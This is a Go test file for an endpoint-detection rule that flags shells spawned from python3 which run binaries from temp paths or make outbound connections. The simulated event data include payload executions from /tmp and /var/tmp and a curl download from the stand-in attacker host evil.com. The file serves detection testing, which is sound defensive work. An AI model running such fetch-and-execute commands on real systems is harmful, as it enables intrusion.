package rules

import (
	"encoding/json"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/fleetdm/edr/server/graph"
	"github.com/fleetdm/edr/server/store"
)

// materialize processes events through the graph builder so processes are
// available for detection rule lookups.
func materialize(t *testing.T, s *store.Store, events []store.Event) {
	t.Helper()
	builder := graph.NewBuilder(s, nil)
	require.NoError(t, builder.ProcessBatch(t.Context(), events))
}

func TestSuspiciousExecDetectsPayloadFromTmp(t *testing.T) {
	s := store.OpenTestStore(t)
	ctx := t.Context()

	// Simulate: python3 (PID 50) → /bin/sh (PID 100) → /tmp/payload (PID 200)
	events := []store.Event{
		{EventID: "fork-python", HostID: "host-a", TimestampNs: 1000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":50,"parent_pid":1}`)},
		{EventID: "exec-python", HostID: "host-a", TimestampNs: 1100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":50,"ppid":1,"path":"/usr/bin/python3","args":["python3","-c","..."],"uid":501,"gid":20}`)},
		{EventID: "fork-sh", HostID: "host-a", TimestampNs: 2000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":100,"parent_pid":50}`)},
		{EventID: "exec-sh", HostID: "host-a", TimestampNs: 2100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":100,"ppid":50,"path":"/bin/sh","args":["sh","-c","..."],"uid":501,"gid":20}`)},
		{EventID: "fork-payload", HostID: "host-a", TimestampNs: 3000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":200,"parent_pid":100}`)},
		{EventID: "exec-payload", HostID: "host-a", TimestampNs: 3100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":200,"ppid":100,"path":"/tmp/payload","args":["/tmp/payload"],"uid":501,"gid":20}`)},
	}

	// Insert and materialize events.
	require.NoError(t, s.InsertEvents(ctx, events))
	materialize(t, s, events)

	rule := &SuspiciousExec{}
	findings, err := rule.Evaluate(ctx, events, s)
	require.NoError(t, err)
	require.Len(t, findings, 1)

	f := findings[0]
	assert.Equal(t, "suspicious_exec", f.RuleID)
	assert.Equal(t, "high", f.Severity)
	assert.Equal(t, "Suspicious exec from temp path", f.Title)
	assert.Contains(t, f.Description, "/usr/bin/python3")
	assert.Contains(t, f.Description, "/bin/sh")
	assert.Contains(t, f.Description, "/tmp/payload")
	assert.Contains(t, f.EventIDs, "exec-sh")
}

// Covers the "shell exec optimization" case on macOS: `sh -c "<single command>"`
// re-execs the target binary directly, reusing the shell's pid instead of
// fork+exec'ing a child. The exec event stream shows two exec events for the
// same pid (first /bin/sh, then the payload), and the processes table ends up
// with the pid's path as the payload. The rule must still fire.
func TestSuspiciousExecDetectsShellReExec(t *testing.T) {
	s := store.OpenTestStore(t)
	ctx := t.Context()

	// Simulate: python3 (PID 50) forks child 100, which execs /bin/sh then
	// immediately re-execs /private/tmp/payload at the same pid. No separate
	// child process for the payload.
	events := []store.Event{
		{EventID: "fork-python", HostID: "host-a", TimestampNs: 1000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":50,"parent_pid":1}`)},
		{EventID: "exec-python", HostID: "host-a", TimestampNs: 1100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":50,"ppid":1,"path":"/usr/bin/python3","args":["python3"],"uid":501,"gid":20}`)},
		{EventID: "fork-sh", HostID: "host-a", TimestampNs: 2000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":100,"parent_pid":50}`)},
		{EventID: "exec-sh", HostID: "host-a", TimestampNs: 2100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":100,"ppid":50,"path":"/bin/sh","args":["sh","-c","/private/tmp/payload pwned"],"uid":501,"gid":20}`)},
		// Same pid (100) re-execs into /private/tmp/payload.
		{EventID: "exec-payload", HostID: "host-a", TimestampNs: 2200, EventType: "exec",
			Payload: json.RawMessage(`{"pid":100,"ppid":50,"path":"/private/tmp/payload","args":["/private/tmp/payload","pwned"],"uid":501,"gid":20}`)},
	}

	require.NoError(t, s.InsertEvents(ctx, events))
	materialize(t, s, events)

	rule := &SuspiciousExec{}
	findings, err := rule.Evaluate(ctx, events, s)
	require.NoError(t, err)
	require.Len(t, findings, 1)

	f := findings[0]
	assert.Equal(t, "suspicious_exec", f.RuleID)
	assert.Equal(t, "high", f.Severity)
	assert.Equal(t, "Suspicious exec from temp path", f.Title)
	assert.Contains(t, f.Description, "/usr/bin/python3")
	assert.Contains(t, f.Description, "/bin/sh")
	assert.Contains(t, f.Description, "/private/tmp/payload")
	assert.Contains(t, f.EventIDs, "exec-sh")
}

func TestSuspiciousExecSkipsShellToShell(t *testing.T) {
	s := store.OpenTestStore(t)
	ctx := t.Context()

	// bash → sh is normal and should not trigger.
	events := []store.Event{
		{EventID: "fork-bash", HostID: "host-a", TimestampNs: 1000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":50,"parent_pid":1}`)},
		{EventID: "exec-bash", HostID: "host-a", TimestampNs: 1100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":50,"ppid":1,"path":"/bin/bash","args":["bash"],"uid":501,"gid":20}`)},
		{EventID: "fork-sh", HostID: "host-a", TimestampNs: 2000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":100,"parent_pid":50}`)},
		{EventID: "exec-sh", HostID: "host-a", TimestampNs: 2100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":100,"ppid":50,"path":"/bin/sh","args":["sh","-c","echo hi"],"uid":501,"gid":20}`)},
	}

	require.NoError(t, s.InsertEvents(ctx, events))
	materialize(t, s, events)

	rule := &SuspiciousExec{}
	findings, err := rule.Evaluate(ctx, events, s)
	require.NoError(t, err)
	assert.Empty(t, findings)
}

func TestSuspiciousExecSkipsNonSuspiciousPath(t *testing.T) {
	s := store.OpenTestStore(t)
	ctx := t.Context()

	// python3 → sh → /usr/bin/ls is not suspicious.
	events := []store.Event{
		{EventID: "fork-py", HostID: "host-a", TimestampNs: 1000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":50,"parent_pid":1}`)},
		{EventID: "exec-py", HostID: "host-a", TimestampNs: 1100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":50,"ppid":1,"path":"/usr/bin/python3","args":["python3"],"uid":501,"gid":20}`)},
		{EventID: "fork-sh", HostID: "host-a", TimestampNs: 2000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":100,"parent_pid":50}`)},
		{EventID: "exec-sh", HostID: "host-a", TimestampNs: 2100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":100,"ppid":50,"path":"/bin/sh","args":["sh","-c","ls"],"uid":501,"gid":20}`)},
		{EventID: "fork-ls", HostID: "host-a", TimestampNs: 3000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":200,"parent_pid":100}`)},
		{EventID: "exec-ls", HostID: "host-a", TimestampNs: 3100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":200,"ppid":100,"path":"/usr/bin/ls","args":["ls"],"uid":501,"gid":20}`)},
	}

	require.NoError(t, s.InsertEvents(ctx, events))
	materialize(t, s, events)

	rule := &SuspiciousExec{}
	findings, err := rule.Evaluate(ctx, events, s)
	require.NoError(t, err)
	assert.Empty(t, findings)
}

func TestSuspiciousExecDetectsVarTmp(t *testing.T) {
	s := store.OpenTestStore(t)
	ctx := t.Context()

	// python3 → zsh → /var/tmp/malware
	events := []store.Event{
		{EventID: "fork-py", HostID: "host-a", TimestampNs: 1000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":50,"parent_pid":1}`)},
		{EventID: "exec-py", HostID: "host-a", TimestampNs: 1100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":50,"ppid":1,"path":"/usr/bin/python3","args":["python3"],"uid":501,"gid":20}`)},
		{EventID: "fork-zsh", HostID: "host-a", TimestampNs: 2000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":100,"parent_pid":50}`)},
		{EventID: "exec-zsh", HostID: "host-a", TimestampNs: 2100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":100,"ppid":50,"path":"/bin/zsh","args":["zsh"],"uid":501,"gid":20}`)},
		{EventID: "fork-mal", HostID: "host-a", TimestampNs: 3000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":200,"parent_pid":100}`)},
		{EventID: "exec-mal", HostID: "host-a", TimestampNs: 3100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":200,"ppid":100,"path":"/var/tmp/malware","args":["/var/tmp/malware"],"uid":501,"gid":20}`)},
	}

	require.NoError(t, s.InsertEvents(ctx, events))
	materialize(t, s, events)

	rule := &SuspiciousExec{}
	findings, err := rule.Evaluate(ctx, events, s)
	require.NoError(t, err)
	require.Len(t, findings, 1)
	assert.Contains(t, findings[0].Description, "/var/tmp/malware")
}

func TestSuspiciousExecSkipsChildOutsideWindow(t *testing.T) {
	s := store.OpenTestStore(t)
	ctx := t.Context()

	// python3 → sh, but child exec from /tmp/ happens 31 seconds later (outside window).
	shellTime := int64(1_000_000_000)
	childTime := shellTime + 31_000_000_000 // 31 seconds later

	events := []store.Event{
		{EventID: "fork-py", HostID: "host-a", TimestampNs: 500_000_000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":50,"parent_pid":1}`)},
		{EventID: "exec-py", HostID: "host-a", TimestampNs: 600_000_000, EventType: "exec",
			Payload: json.RawMessage(`{"pid":50,"ppid":1,"path":"/usr/bin/python3","args":["python3"],"uid":501,"gid":20}`)},
		{EventID: "fork-sh", HostID: "host-a", TimestampNs: shellTime, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":100,"parent_pid":50}`)},
		{EventID: "exec-sh", HostID: "host-a", TimestampNs: shellTime + 100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":100,"ppid":50,"path":"/bin/sh","args":["sh"],"uid":501,"gid":20}`)},
		{EventID: "fork-late", HostID: "host-a", TimestampNs: childTime, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":200,"parent_pid":100}`)},
		{EventID: "exec-late", HostID: "host-a", TimestampNs: childTime + 100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":200,"ppid":100,"path":"/tmp/payload","args":["/tmp/payload"],"uid":501,"gid":20}`)},
	}

	require.NoError(t, s.InsertEvents(ctx, events))
	materialize(t, s, events)

	rule := &SuspiciousExec{}
	findings, err := rule.Evaluate(ctx, events, s)
	require.NoError(t, err)
	assert.Empty(t, findings)
}

func TestSuspiciousExecPathTraversal(t *testing.T) {
	s := store.OpenTestStore(t)
	ctx := t.Context()

	// python3 → sh → /usr/local/../../../tmp/evil
	events := []store.Event{
		{EventID: "fork-py", HostID: "host-a", TimestampNs: 1000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":50,"parent_pid":1}`)},
		{EventID: "exec-py", HostID: "host-a", TimestampNs: 1100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":50,"ppid":1,"path":"/usr/bin/python3","args":["python3"],"uid":501,"gid":20}`)},
		{EventID: "fork-sh", HostID: "host-a", TimestampNs: 2000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":100,"parent_pid":50}`)},
		{EventID: "exec-sh", HostID: "host-a", TimestampNs: 2100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":100,"ppid":50,"path":"/bin/sh","args":["sh"],"uid":501,"gid":20}`)},
		{EventID: "fork-evil", HostID: "host-a", TimestampNs: 3000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":200,"parent_pid":100}`)},
		{EventID: "exec-evil", HostID: "host-a", TimestampNs: 3100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":200,"ppid":100,"path":"/usr/local/../../../tmp/evil","args":["/usr/local/../../../tmp/evil"],"uid":501,"gid":20}`)},
	}

	require.NoError(t, s.InsertEvents(ctx, events))
	materialize(t, s, events)

	rule := &SuspiciousExec{}
	findings, err := rule.Evaluate(ctx, events, s)
	require.NoError(t, err)
	require.Len(t, findings, 1)
	assert.Contains(t, findings[0].Description, "..")
}

func TestSuspiciousExecDetectsShellWithOutboundConnection(t *testing.T) {
	s := store.OpenTestStore(t)
	ctx := t.Context()

	// python3 (PID 50) → /bin/sh (PID 100) → curl (PID 200) which makes an outbound connection.
	// curl's path is /usr/bin/curl (not suspicious), but the outbound network connection triggers detection.
	events := []store.Event{
		{EventID: "fork-py", HostID: "host-a", TimestampNs: 1000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":50,"parent_pid":1}`)},
		{EventID: "exec-py", HostID: "host-a", TimestampNs: 1100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":50,"ppid":1,"path":"/usr/bin/python3","args":["python3"],"uid":501,"gid":20}`)},
		{EventID: "fork-sh", HostID: "host-a", TimestampNs: 2000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":100,"parent_pid":50}`)},
		{EventID: "exec-sh", HostID: "host-a", TimestampNs: 2100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":100,"ppid":50,"path":"/bin/sh","args":["sh","-c","curl ..."],"uid":501,"gid":20}`)},
		{EventID: "fork-curl", HostID: "host-a", TimestampNs: 3000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":200,"parent_pid":100}`)},
		{EventID: "exec-curl", HostID: "host-a", TimestampNs: 3100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":200,"ppid":100,"path":"/usr/bin/curl","args":["curl","https://evil.com/payload"],"uid":501,"gid":20}`)},
		{EventID: "net-curl", HostID: "host-a", TimestampNs: 3500, EventType: "network_connect",
			Payload: json.RawMessage(`{"pid":200,"path":"/usr/bin/curl","uid":501,"protocol":"tcp","direction":"outbound","local_address":"10.0.1.5","local_port":54321,"remote_address":"198.51.100.42","remote_port":443,"remote_hostname":"evil.com"}`)},
	}

	require.NoError(t, s.InsertEvents(ctx, events))
	materialize(t, s, events)

	rule := &SuspiciousExec{}
	findings, err := rule.Evaluate(ctx, events, s)
	require.NoError(t, err)
	require.Len(t, findings, 1)

	f := findings[0]
	assert.Equal(t, "suspicious_exec", f.RuleID)
	assert.Equal(t, "high", f.Severity)
	assert.Equal(t, "Shell spawn with outbound network connection", f.Title)
	assert.Contains(t, f.Description, "198.51.100.42:443")
	assert.Contains(t, f.EventIDs, "exec-sh")
	assert.Contains(t, f.EventIDs, "net-curl")
}

func TestSuspiciousExecPrefersSuspiciousPathOverNetwork(t *testing.T) {
	s := store.OpenTestStore(t)
	ctx := t.Context()

	// python3 → sh → /tmp/payload (suspicious path) AND outbound connection.
	// Should fire the path-based alert, not the network one (avoid double-alerting).
	events := []store.Event{
		{EventID: "fork-py", HostID: "host-a", TimestampNs: 1000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":50,"parent_pid":1}`)},
		{EventID: "exec-py", HostID: "host-a", TimestampNs: 1100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":50,"ppid":1,"path":"/usr/bin/python3","args":["python3"],"uid":501,"gid":20}`)},
		{EventID: "fork-sh", HostID: "host-a", TimestampNs: 2000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":100,"parent_pid":50}`)},
		{EventID: "exec-sh", HostID: "host-a", TimestampNs: 2100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":100,"ppid":50,"path":"/bin/sh","args":["sh"],"uid":501,"gid":20}`)},
		{EventID: "fork-payload", HostID: "host-a", TimestampNs: 3000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":200,"parent_pid":100}`)},
		{EventID: "exec-payload", HostID: "host-a", TimestampNs: 3100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":200,"ppid":100,"path":"/tmp/payload","args":["/tmp/payload"],"uid":501,"gid":20}`)},
		{EventID: "net-payload", HostID: "host-a", TimestampNs: 3500, EventType: "network_connect",
			Payload: json.RawMessage(`{"pid":200,"path":"/tmp/payload","uid":501,"protocol":"tcp","direction":"outbound","local_address":"10.0.1.5","local_port":54321,"remote_address":"198.51.100.42","remote_port":443,"remote_hostname":"evil.com"}`)},
	}

	require.NoError(t, s.InsertEvents(ctx, events))
	materialize(t, s, events)

	rule := &SuspiciousExec{}
	findings, err := rule.Evaluate(ctx, events, s)
	require.NoError(t, err)
	require.Len(t, findings, 1)

	// Should be the path-based finding, not the network one.
	assert.Equal(t, "Suspicious exec from temp path", findings[0].Title)
}

func TestIsSuspiciousPath(t *testing.T) {
	tests := []struct {
		name       string
		path       string
		suspicious bool
	}{
		{"tmp", "/tmp/payload", true},
		{"var tmp", "/var/tmp/malware", true},
		{"private tmp", "/private/tmp/x", true},
		{"dev shm", "/dev/shm/backdoor", true},
		{"path traversal", "/usr/../tmp/x", true},
		{"usr bin", "/usr/bin/ls", false},
		{"usr local", "/usr/local/bin/brew", false},
		{"applications", "/Applications/Safari.app/Contents/MacOS/Safari", false},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			assert.Equal(t, tc.suspicious, isSuspiciousPath(tc.path))
		})
	}
}
